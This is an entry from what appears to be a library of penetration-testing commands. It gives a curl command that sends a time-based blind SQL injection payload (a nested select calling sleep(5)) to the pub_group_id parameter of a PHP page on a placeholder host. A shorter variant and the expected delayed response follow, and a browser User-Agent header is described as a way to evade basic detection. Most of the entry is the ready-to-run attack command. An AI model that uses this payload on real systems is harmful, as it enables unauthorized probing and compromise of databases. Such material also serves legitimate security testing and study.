---
id: cmd-uuid-001
data: >-
  curl -X GET
  "https://target.com/pubs/move_papers.php?pub_group_id=a'+(select*from(select(sleep(5)))a)+'"
  -H "Host: target.com" -H "Connection: keep-alive" -H "Cache-Control:
  max-age=0" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0
  (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
  Chrome/71.0.3578.98 Safari/537.36" -H "Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
  -H "Accept-Encoding: gzip, deflate, br" -H "Accept-Language:
  en,ru;q=0.9,en-US;q=0.8,uk;q=0.7" -H "Cookie: session_cookie"
tags:
  - sqli
  - poc
type: command
output: HTTP response delayed by 5 seconds
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.541Z'
verified: false
validated: true
submitted: true
---
# time-based-sqli-poc-get-request

## Command

```bash
curl -X GET "https://target.com/pubs/move_papers.php?pub_group_id=a'+(select*from(select(sleep(5)))a)+'" -H "Host: target.com" -H "Connection: keep-alive" -H "Cache-Control: max-age=0" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Accept-Encoding: gzip, deflate, br" -H "Accept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7" -H "Cookie: session_cookie"
```

## Description

This curl command sends a GET request with a time-based SQL injection payload in the pub_group_id parameter to test for blind SQLi in a PHP/MySQL application, triggering a 5-second sleep if vulnerable.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `pub_group_id` | Payload parameter value with sleep injection | Yes |
| `-H "Host: ..."` | Specifies the target host | Yes |
| `-H "User-Agent: ..."` | Mimics browser to evade basic detection | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://target.com/pubs/move_papers.php?pub_group_id=a'+(select*from(select(sleep(5)))a)+'" -H "User-Agent: Mozilla/5.0"
```

### Advanced Usage

Include full headers as above for realistic simulation.

## Expected Output

The HTTP response body from the application, but crucially, the total request time is ~5 seconds longer than a normal request, indicating successful injection.

## Related

- [[Related Procedure: Test-for-Time-Based-SQL-Injection-Vulnerability]]
